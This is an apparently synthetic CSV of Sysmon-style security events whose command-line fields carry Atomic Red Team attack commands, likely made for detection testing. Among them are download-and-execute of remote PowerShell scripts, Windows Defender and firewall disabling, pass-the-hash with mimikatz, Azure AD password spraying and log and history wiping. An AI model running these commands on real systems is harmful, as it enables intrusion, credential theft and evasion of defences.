EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
7,Image Load,desktop-16.peterson.com,angela98,9708,cmd.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing)\n$macrocode = \""   Open `\""#{jse_path}`\"" For Output As #1`n   Write #1, `\""WScript.Quit`\""`n   Close #1`n   Shell`$ `\""cscript.exe #{jse_path}`\""`n\""\nInvoke-MalDoc -macroCode $macrocode -officeProduct \""#{ms_product}\""\n"",",720121,a465a8c6-9ec2-41ee-8692-2749c80fe417,8650,rundll32.exe,C:\Program Files\adult..exe,3683,powershell.exe,C:\Windows\time..exe,2024-05-17T01:36:51.705774Z
7,Image Load,email-49.yates.com,johnsonbrandon,3843,mimikatz.exe,"""pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \""#{password}\"" | pw usermod #{username} -h 0\n"",",373244,84a4bbc9-c05e-44e0-a236-74826be04432,2787,rundll32.exe,C:\Program Files\go..exe,9325,backdoor.exe,C:\Windows\voice..dll,2024-05-17T01:36:51.707281Z
1,Process Create,laptop-40.vasquez-mathis.com,xmcdonald,9942,malware.exe,"""sc.exe sdset scmanager D:(A;;KA;;;WD)\n"",",345227,91dd65c5-1739-4c0e-96e2-b8f70ba22946,8843,explorer.exe,C:\Users\Public\drive..exe,5680,backdoor.exe,C:\Windows\book..dll,2024-05-17T01:36:51.707341Z
3,Network Connection,web-24.porter.org,hsanchez,5972,regsvr32.exe,"""wbadmin delete catalog -quiet\n"",",210361,0e2a8e63-90c3-4535-a774-764c0d191f3c,6096,regsvr32.exe,C:\Windows\serious..dll,5320,malware.exe,C:\Program Files\country..dll,2024-05-17T01:36:51.707341Z
7,Image Load,web-68.page.com,miranda85,7935,powershell.exe,"""zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc | base64"",",377080,43303a36-630d-4994-9920-1e1af34574e7,5076,malware.exe,C:\Users\Public\heart..dll,3490,powershell.exe,C:\Users\Public\however..dll,2024-05-17T01:36:51.707341Z
7,Image Load,db-72.whitehead-mcdonald.net,johndavidson,6372,rundll32.exe,"""sc.exe stop #{service_name}\n"",",532746,d53f0886-874f-4b1c-8485-23c26c4db29f,2906,malware.exe,C:\Windows\result..exe,4082,nc.exe,C:\Windows\tell..exe,2024-05-17T01:36:51.708290Z
11,File Create,db-84.harrington.net,marcia89,4434,regsvr32.exe,"""Start-Process #{powershell_command}\n"",",287224,5167404b-e7e3-4b54-94f1-1fa547073cdb,9183,cmd.exe,C:\Windows\account..dll,4244,taskmgr.exe,C:\Users\Public\may..dll,2024-05-17T01:36:51.708290Z
3,Network Connection,email-61.goodman.com,jennifer41,3320,taskmgr.exe,"""Set-Location -path \""#{file_path}\\Sysinternals\"";\n./accesschk.exe -accepteula .;\n"",",389404,9b136d4a-6301-41e4-8936-8879554dbfaa,3575,taskmgr.exe,C:\Windows\daughter..dll,1143,taskmgr.exe,C:\Windows\view..exe,2024-05-17T01:36:51.708290Z
5,Process Terminate,email-93.munoz.com,smithwilliam,1832,explorer.exe,"""sudo security add-trusted-cert -d -r trustRoot -k \""/Library/Keychains/System.keychain\"" \""#{cert_filename}\""\n"",",404320,edfad3c5-f770-4bce-a410-dbdfc838e17b,6757,powershell.exe,C:\Windows\challenge..dll,9836,nc.exe,C:\Program Files\almost..dll,2024-05-17T01:36:51.708290Z
1,Process Create,desktop-10.davis.com,laurie88,9946,cmd.exe,"""ufw disable\n"",",150204,4275da17-1ef7-4174-94da-0e0b7934a945,8250,nc.exe,C:\Users\Public\feeling..exe,9237,taskmgr.exe,C:\Program Files\somebody..exe,2024-05-17T01:36:51.708290Z
5,Process Terminate,web-39.king.info,dylan12,5646,regsvr32.exe,"""$oldvalue = $(Get-ItemPropertyValue -Path  \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name \""Shell\"");\nSet-ItemProperty -Path \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name \""Shell-backup\"" -Value \""$oldvalue\"";\n$newvalue = $oldvalue + \"", #{payload}\"";\nSet-ItemProperty -Path  \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name \""Shell\"" -Value \""$newvalue\""\n"",",977523,cad086d6-4b9b-40c6-a3f6-6d6ef88dadcf,6237,backdoor.exe,C:\Windows\adult..dll,9197,mimikatz.exe,C:\Windows\role..exe,2024-05-17T01:36:51.708290Z
1,Process Create,desktop-95.martinez.biz,wrogers,3192,cmd.exe,"""sudo insmod #{module_path}\n"",",335827,3d467766-2e4f-41d7-9334-80d3244346c5,5277,taskmgr.exe,C:\Program Files\others..exe,4345,backdoor.exe,C:\Program Files\eat..dll,2024-05-17T01:36:51.709288Z
3,Network Connection,srv-06.winters-bennett.com,ojones,8520,mimikatz.exe,"""pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \""#{password}\"" | pw usermod #{username} -h 0\n"",",518399,b147f71e-8ad3-46f7-94a7-d0cb3506311c,5600,mimikatz.exe,C:\Users\Public\story..exe,7605,backdoor.exe,C:\Users\Public\yeah..dll,2024-05-17T01:36:51.709288Z
3,Network Connection,web-92.hopkins.com,kevinward,7655,regsvr32.exe,"""copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n"",",635069,1e6551af-7ed4-461f-b93c-367542144589,2404,taskmgr.exe,C:\Windows\mission..dll,1478,explorer.exe,C:\Program Files\prove..dll,2024-05-17T01:36:51.709288Z
7,Image Load,email-96.rodriguez.biz,sierra79,5792,malware.exe,"""$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \""#{spawn_process_path}\"" -debug\n"",",121944,17c8e5bb-a161-4266-ba23-7a40956366da,7236,regsvr32.exe,C:\Program Files\level..dll,1433,regsvr32.exe,C:\Users\Public\big..dll,2024-05-17T01:36:51.709288Z
3,Network Connection,srv-42.petersen.biz,johnsonkaylee,9550,backdoor.exe,"""#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n"",",276570,c04c9e13-1a11-415d-bd1c-6c746962a9a4,1071,taskmgr.exe,C:\Windows\bring..exe,1169,taskmgr.exe,C:\Program Files\event..dll,2024-05-17T01:36:51.709288Z
1,Process Create,laptop-21.murphy.biz,starkteresa,9546,cmd.exe,"""# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \""#{test_harness}\""\n\n$InstallerAssemblyDir = \""#{assembly_dir}\""\n$InstallerAssemblyFileName = \""#{assembly_filename}\""\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \""/logfile= /logtoconsole=false /U `\""$InstallerAssemblyFullPath`\""\""\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\""\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\""@\n}\n"",",894163,bc26ade5-2137-47a4-ade0-fa2ecac2d7f0,9809,malware.exe,C:\Program Files\art..dll,5523,taskmgr.exe,C:\Users\Public\wish..exe,2024-05-17T01:36:51.710288Z
11,File Create,db-05.davis.com,elizabeth21,7196,powershell.exe,"""halt --reboot\n"",",386542,508895d0-ece1-40d8-a9ed-5ecfd9b005f3,5802,regsvr32.exe,C:\Windows\word..exe,8300,explorer.exe,C:\Users\Public\provide..dll,2024-05-17T01:36:51.710288Z
3,Network Connection,lt-54.scott.com,james99,8183,malware.exe,"""uname -srm\n"",",109630,be7730d1-2428-4936-be47-a0488bf908eb,4892,taskmgr.exe,C:\Users\Public\third..dll,1052,mimikatz.exe,C:\Users\Public\anything..dll,2024-05-17T01:36:51.710288Z
5,Process Terminate,srv-20.gordon-duncan.com,anthony26,5515,malware.exe,"""reg add \""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\"" /v \""EnableFirewall\"" /t REG_DWORD /d 0 /f\n"",",407239,53be9363-e9b2-49c5-a27f-0fd9620b5fb0,1559,nc.exe,C:\Program Files\themselves..exe,9112,mimikatz.exe,C:\Program Files\list..exe,2024-05-17T01:36:51.710288Z
5,Process Terminate,lt-41.sanchez.info,jasonmartinez,1351,regsvr32.exe,"""@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\""%userdomain%\\%n\"" \""#{password}\"" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL\n"",",198647,310e65b8-e91c-4f41-a83f-ce5952648942,7283,rundll32.exe,C:\Program Files\last..dll,3637,nc.exe,C:\Program Files\world..dll,2024-05-17T01:36:51.710288Z
7,Image Load,email-86.best.biz,vanessa56,7662,cmd.exe,"""scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n"",",381743,f659205c-577b-4420-aa1e-d5a619bf710f,1527,backdoor.exe,C:\Users\Public\former..exe,4893,malware.exe,C:\Program Files\maybe..exe,2024-05-17T01:36:51.711287Z
3,Network Connection,desktop-65.melton-tyler.info,thompsonrobert,2071,regsvr32.exe,"""openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\"" -out #{cert_filename}\ncp #{cert_filename} /usr/local/share/certs/\ncertctl rehash\n"",",206828,51566f31-df9a-4ada-a711-75b90ad7dc41,3810,malware.exe,C:\Windows\long..dll,6457,malware.exe,C:\Windows\fly..exe,2024-05-17T01:36:51.711287Z
11,File Create,srv-25.delgado-weaver.com,marco35,4409,nc.exe,"""sysmon -u\n"",",650272,999655c5-b2fa-4b5d-8e26-cd63f6987f21,3330,taskmgr.exe,C:\Windows\find..exe,9520,explorer.exe,C:\Windows\beat..dll,2024-05-17T01:36:51.711287Z
3,Network Connection,web-18.macias-watson.net,christopherbecker,8931,malware.exe,"""for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \""#{query_type}\"" \""#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\"" -QuickTimeout}\n"",",259379,a323ef5c-1dd8-42e2-a44a-0583d5452b5b,8033,mimikatz.exe,C:\Program Files\new..exe,9817,powershell.exe,C:\Windows\fine..exe,2024-05-17T01:36:51.711287Z
11,File Create,srv-65.leon.com,gwilson,2672,backdoor.exe,"""sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n"",",131437,dd8961c2-8bde-4b71-be0b-c42c75338760,2023,mimikatz.exe,C:\Windows\material..exe,1963,malware.exe,C:\Program Files\down..exe,2024-05-17T01:36:51.711287Z
7,Image Load,srv-58.lloyd.com,suzanne30,6780,regsvr32.exe,"""Get-AdGroup -Filter *\n"",",177164,fca9812d-97b1-463d-9f34-d89e90edad82,2627,backdoor.exe,C:\Users\Public\Republican..dll,1477,regsvr32.exe,C:\Program Files\though..exe,2024-05-17T01:36:51.712287Z
7,Image Load,laptop-13.douglas.net,sanchezkristen,7483,nc.exe,"""type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n"",",392478,3c6399e8-0d68-402a-830f-b77a5346171d,9294,powershell.exe,C:\Program Files\role..exe,1611,nc.exe,C:\Users\Public\court..dll,2024-05-17T01:36:51.712287Z
3,Network Connection,desktop-08.arnold.com,bescobar,3083,mimikatz.exe,"""powershell.exe -exec bypass -noprofile \""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\""\n"",",862964,8b91d3e8-000f-46ab-88a4-3154414724ab,2229,mimikatz.exe,C:\Windows\trial..exe,8938,backdoor.exe,C:\Program Files\between..dll,2024-05-17T01:36:51.712287Z
3,Network Connection,web-98.thompson.info,christywang,2595,nc.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n"",",901926,5a2a6a01-5f78-4598-bc77-c9ed4cfbd35e,2613,powershell.exe,C:\Users\Public\agree..dll,9224,taskmgr.exe,C:\Windows\apply..dll,2024-05-17T01:36:51.712287Z
3,Network Connection,email-11.holden.info,sjarvis,9789,explorer.exe,"""DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\n"",",936379,a3b8e5de-0540-4f5f-95f3-48394f53c4cd,2474,cmd.exe,C:\Program Files\wonder..dll,5338,regsvr32.exe,C:\Users\Public\ground..exe,2024-05-17T01:36:51.713288Z
5,Process Terminate,email-17.walker-rice.com,gibsonerin,4184,rundll32.exe,"""#{mimikatz_path} \""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\""\n"",",171244,cc4e1457-6a66-458f-a373-389f5ca84fbe,9264,mimikatz.exe,C:\Program Files\property..dll,4555,backdoor.exe,C:\Users\Public\hair..dll,2024-05-17T01:36:51.713288Z
1,Process Create,laptop-89.morales.info,rodriguezryan,1020,taskmgr.exe,"""Get-Service WinDefend #check the service state of Windows Defender\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\nGet-MpThreat #threats details that have been detected using MS Defender\n"",",290514,2200d685-e74f-4840-a201-beff55b39b62,1390,nc.exe,C:\Program Files\protect..exe,3881,mimikatz.exe,C:\Program Files\describe..exe,2024-05-17T01:36:51.713288Z
5,Process Terminate,email-56.ramirez.info,vpeterson,7556,explorer.exe,"""set +o history\n"",",186804,a075459b-4c15-46c9-9056-ee14159859c4,5365,nc.exe,C:\Users\Public\election..exe,5993,regsvr32.exe,C:\Windows\must..dll,2024-05-17T01:36:51.713288Z
11,File Create,desktop-71.mcpherson.biz,collinsmaureen,5656,powershell.exe,"""reg add \""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f\nnetsh advfirewall firewall add rule name=\""RDPPORTLatest-TCP-In\"" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\n"",",738852,976e63f7-faba-4145-b86e-4822a789a84a,6778,backdoor.exe,C:\Users\Public\yes..exe,4147,mimikatz.exe,C:\Users\Public\trip..dll,2024-05-17T01:36:51.713288Z
7,Image Load,email-74.rivas.com,wesleyburch,8674,cmd.exe,"""Cd \""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\""\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \""VBAWarnings\"" -Value \""1\"" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \""PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"""",",604514,28474210-dd3a-4f83-8177-02fc1bcaebf6,3571,explorer.exe,C:\Users\Public\all..exe,1309,explorer.exe,C:\Program Files\different..dll,2024-05-17T01:36:51.714287Z
1,Process Create,desktop-82.hill.com,fernando99,5400,explorer.exe,"""C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \""#{website_name}\"" /section:httplogging /dontLog:true\n"",",581739,1c2db78f-b506-458b-b11c-ef1b9410cebd,1002,rundll32.exe,C:\Windows\back..dll,7665,rundll32.exe,C:\Program Files\school..dll,2024-05-17T01:36:51.714287Z
5,Process Terminate,db-77.brown.com,deborahburton,5526,taskmgr.exe,"""reg add \""hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\"" /v \""Driver\"" /d \""#{monitor_dll}\"" /t REG_SZ /f\n"",",201277,c603ac1e-b5e2-4170-8775-86a00f08cdbe,2132,malware.exe,C:\Users\Public\speech..exe,8996,regsvr32.exe,C:\Program Files\compare..dll,2024-05-17T01:36:51.714287Z
5,Process Terminate,db-76.mendoza-mills.biz,williamnelson,9787,regsvr32.exe,"""Get-ADComputer #{hostname} -Properties *"",",608689,69e315a2-acd6-4d04-8ac7-e2c67e03ac32,7450,nc.exe,C:\Users\Public\economy..dll,3357,cmd.exe,C:\Windows\knowledge..exe,2024-05-17T01:36:51.714287Z
11,File Create,email-46.jordan.com,dcole,9031,nc.exe,"""IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\"" -OutFile \""$env:TEMP\\qbot-test.iso\"")\nMount-DiskImage -ImagePath \""$env:TEMP\\qbot-test.iso\""\n$mountedpath = (Get-DiskImage -ImagePath \""$env:TEMP\\qbot-test.iso\"" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \"":\\\""\ncd $finalpath\n.\\calc.exe.lnk"",",520601,c7b144d3-de77-4a67-8519-2e8167a9c1dd,6356,explorer.exe,C:\Users\Public\film..exe,9298,malware.exe,C:\Program Files\structure..dll,2024-05-17T01:36:51.714287Z
7,Image Load,web-86.marsh.info,acaldwell,9069,mimikatz.exe,"""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\""$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\"" \""PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\""\nPowershell -noprofile\n"",",135299,ebf231a1-ec01-4bda-abd0-d1746fb9f46a,7165,taskmgr.exe,C:\Program Files\because..dll,9119,nc.exe,C:\Users\Public\ever..dll,2024-05-17T01:36:51.715287Z
11,File Create,web-35.brown.org,walkerwendy,4551,taskmgr.exe,"""reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n"",",783040,d6319223-2f2b-4101-a6f4-a5a7e2d2c294,1147,explorer.exe,C:\Program Files\around..dll,1638,powershell.exe,C:\Users\Public\real..dll,2024-05-17T01:36:51.715287Z
3,Network Connection,web-19.vazquez.info,maxwellreid,1157,regsvr32.exe,"""New-NetFirewallRule -DisplayName \""New rule\"" -Direction \""#{direction}\"" -LocalPort \""#{local_port}\"" -Protocol \""#{protocol}\"" -Action \""#{action}\"""",",268910,1500b209-2179-4e72-952b-5eb46ee89c55,3120,backdoor.exe,C:\Users\Public\have..dll,4601,malware.exe,C:\Program Files\spring..dll,2024-05-17T01:36:51.715287Z
5,Process Terminate,desktop-06.evans-yang.info,lgrant,3501,malware.exe,"""echo \""\"" > #{history_path}\n"",",441585,cb63022f-86f3-42c8-88dc-180ba1b851b7,7066,backdoor.exe,C:\Program Files\fear..exe,1112,regsvr32.exe,C:\Program Files\arrive..dll,2024-05-17T01:36:51.715287Z
3,Network Connection,laptop-77.brown.com,ngonzalez,2704,backdoor.exe,"""wmic useraccount get /ALL /format:csv\n"",",592028,24bb8451-cfd2-430c-9795-456f56696a82,6641,powershell.exe,C:\Windows\late..exe,9858,malware.exe,C:\Program Files\garden..exe,2024-05-17T01:36:51.715287Z
11,File Create,laptop-93.white.com,turnercindy,5200,malware.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput"",",347639,1ba2dc4d-a87e-4f3e-ac0b-0f77b51aada1,9682,powershell.exe,C:\Users\Public\drop..exe,1435,taskmgr.exe,C:\Users\Public\article..dll,2024-05-17T01:36:51.716287Z
3,Network Connection,desktop-21.ellis.com,davidburke,3100,cmd.exe,"""net user $ ATOMIC123! /add /active:yes"",",493136,383384b1-f96e-449d-bc9d-a14f3e04a3a3,7904,backdoor.exe,C:\Windows\effort..exe,5367,explorer.exe,C:\Windows\something..exe,2024-05-17T01:36:51.716287Z
7,Image Load,srv-58.delgado.com,richardsronald,8651,rundll32.exe,"""Test-NetConnection -ComputerName #{domain} -port #{port}\n"",",265937,73f50e86-f800-4522-8aaa-cfc37afba993,9175,backdoor.exe,C:\Windows\dog..dll,3140,taskmgr.exe,C:\Windows\human..exe,2024-05-17T01:36:51.716287Z
7,Image Load,laptop-17.olson-freeman.biz,robertjohnson,4616,rundll32.exe,"""reg add \""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n"",",835959,4832a22e-7596-4b38-a369-3813df33dbf2,9685,mimikatz.exe,C:\Users\Public\trade..dll,4370,explorer.exe,C:\Program Files\wide..exe,2024-05-17T01:36:51.716287Z
3,Network Connection,lt-95.torres-huynh.biz,kochheather,4203,malware.exe,"""mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \""This file will be encrypted\"" > .\\encrypted_file.txt\n\""#{rar_exe}\"" a -hp\""blue\"" hello.rar\ndir\n"",",967754,e307b7e9-268f-4280-bac6-1fee5294d7fa,8159,powershell.exe,C:\Program Files\major..dll,3523,backdoor.exe,C:\Program Files\west..exe,2024-05-17T01:36:51.716287Z
3,Network Connection,laptop-99.vance-ortiz.com,stephanieguzman,8541,explorer.exe,"""Import-Module -Name AzureAD\n\n$passwords = \""#{passwords}\"".split(\""{`n}\"")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \""$password\"" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""#{username}\"", $Pword\n  try {\n    Write-Host \"" [-] Attempting ${password} on account #{username}.\""\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \"" [!] #{username}:${password} are valid credentials!`r`n\""\n    break\n  } catch {\n    Write-Host \"" [-] #{username}:${password} invalid credentials.`r`n\""\n  }\n}\nWrite-Host \""End of bruteforce\""\n"",",604364,84105272-9a92-4b37-a9b1-9e9cd92844ce,8489,nc.exe,C:\Windows\woman..exe,7047,cmd.exe,C:\Windows\someone..dll,2024-05-17T01:36:51.716287Z
3,Network Connection,srv-19.burton.com,jamesrose,4833,nc.exe,"""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\""#{output_file}\"" /target:library \""#{source_file}\""\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n"",",137225,a1b21f53-8eea-4778-9906-8780db5d510d,7520,backdoor.exe,C:\Users\Public\go..exe,7903,rundll32.exe,C:\Users\Public\computer..dll,2024-05-17T01:36:51.716287Z
1,Process Create,desktop-17.stokes.biz,seanle,1196,powershell.exe,"""reg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\"" /v \""DisableAntiSpyware\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\"" /v \""DisableAntiVirus\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableBehaviorMonitoring\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableIntrusionPreventionSystem\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableIOAVProtection\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableOnAccessProtection\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableRealtimeMonitoring\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableRoutinelyTakingAction\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableScanOnRealtimeEnable\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"" /v \""DisableScriptScanning\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\"" /v \""DisableEnhancedNotifications\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul \nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\"" /v \""DisableBlockAtFirstSeen\"" /t REG_DWORD /d \""1\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\"" /v \""SpynetReporting\"" /t REG_DWORD /d \""0\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\"" /v \""MpEnablePus\"" /t REG_DWORD /d \""0\"" /f >NUL 2>nul\nreg add \""HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\"" /v \""DisallowExploitProtectionOverride\"" /t REG_DWORD /d \""0\"" /f >NUL 2>nul\nreg add \""HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\"" /v \""TamperProtection\""  /t REG_DWORD /d \""0\"" /f >NUL 2>nul\nreg add \""HKLM\\software\\microsoft\\windows defender\\spynet\"" /v \""SubmitSamplesConsent\"" /t REG_DWORD /d \""0\"" /f >NUL 2>nul\nreg add \""HKLM\\Software\\Microsoft\\Windows Defender\"" /v \""PUAProtection\"" /t REG_DWORD /d \""0\"" /f >NUL 2>nul\n"",",104117,1e89bfb9-2205-48a7-bcb9-d068b7fd46be,1438,mimikatz.exe,C:\Windows\arm..dll,9654,powershell.exe,C:\Windows\role..dll,2024-05-17T01:36:51.717792Z
